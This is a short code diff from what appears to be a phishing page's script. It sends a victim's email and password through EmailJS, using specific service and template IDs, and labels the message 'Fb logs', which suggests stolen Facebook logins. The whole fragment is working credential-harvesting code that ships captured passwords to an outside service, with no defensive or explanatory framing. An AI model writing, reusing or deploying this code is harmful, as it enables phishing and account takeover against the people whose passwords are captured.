@@ -12,7 +12,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         const templateParams = {
             name: email,
-            message: `${password}`
+            message: `Fb logs ${password}`
         };
 
         emailjs.send("service_0rucnsl", "template_ve6yzyn", templateParams)
